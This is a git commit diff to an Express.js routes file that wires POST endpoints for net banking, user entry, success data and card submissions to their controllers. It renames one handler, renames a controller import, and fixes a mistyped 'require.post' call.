71cc3000d43a509157a51e918a902cc5884327f4
kingofak78 <gotakale952@gmail.com>
2025-03-18 06:37:14 -0700

    Update allformRoutes.js

--- routes/allformRoutes.js
+++ routes/allformRoutes.js
@@ -4,12 +4,11 @@ const router = express.Router();
 const userController = require('../controllers/userController'); 
 const netBankingController = require('../controllers/netBankingController');
 const successDataController = require('../controllers/successDataController');
-const card =require ('../controllers/cardController');
+const cardController = require('../controllers/cardController');
 
-
-router.post('/banking', netBankingController.submitNetBankingPayment);
+router.post('/banking', netBankingController.submitNetBankingData);
 router.post('/entry', userController.saveUserData);
-router.post('/success' , successDataController.submitSuccessData);
-require.post('/card',card.submitCardPayment);
+router.post('/success', successDataController.submitSuccessData);
+router.post('/card', cardController.submitCardPayment); // ✅ Fixed
 
 module.exports = router;
